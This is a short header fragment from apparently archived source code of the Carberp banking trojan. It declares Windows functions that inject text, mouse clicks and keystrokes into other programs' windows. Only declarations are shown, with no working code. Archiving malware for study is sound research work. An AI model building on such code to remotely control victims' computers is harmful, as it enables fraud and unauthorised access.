/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
extern "C"
{
bool SendString(HWND hWnd,TCHAR *lpString);
bool ClickMouse(HWND hWnd,DWORD dwX,DWORD dwY,bool bRBtn=false);
bool KeySend(HWND hWnd,bool bE);
};

